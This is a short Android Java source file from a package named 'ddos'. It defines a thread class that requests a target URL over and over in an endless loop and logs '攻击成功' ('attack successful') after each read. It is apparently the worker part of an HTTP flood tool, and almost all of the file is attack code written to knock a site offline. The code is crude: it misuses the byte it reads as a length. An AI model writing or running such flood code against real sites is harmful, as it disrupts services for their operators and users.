package com.dtsj.ddos;

import android.util.Log;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;

public class MythreadCus implements Runnable {

    public MythreadCus() {
    }
    private String urlH;

    public MythreadCus(String urlH) {
        this.urlH = urlH;
    }

    public void run() {
        while (true) {
            try {
                URL url = new URL(urlH);
                URLConnection conn = url.openConnection();
                BufferedInputStream bis = new BufferedInputStream(
                        conn.getInputStream());
                byte[] bytes = new byte[1024];
                int len = -1;
                StringBuffer sb = new StringBuffer();

                if (bis != null) {
                    if ((len = bis.read()) != -1) {
                        sb.append(new String(bytes, 0, len));
                        //System.out.println("attackMASTER");
                        Log.e("sunder","攻击成功");
                        bis.close();
                    }
                }
            } catch (MalformedURLException e) {
                e.printStackTrace();
            } catch (IOException e) {

                e.printStackTrace();
            }

        }

/*  while (true){

  }*/
    }
}
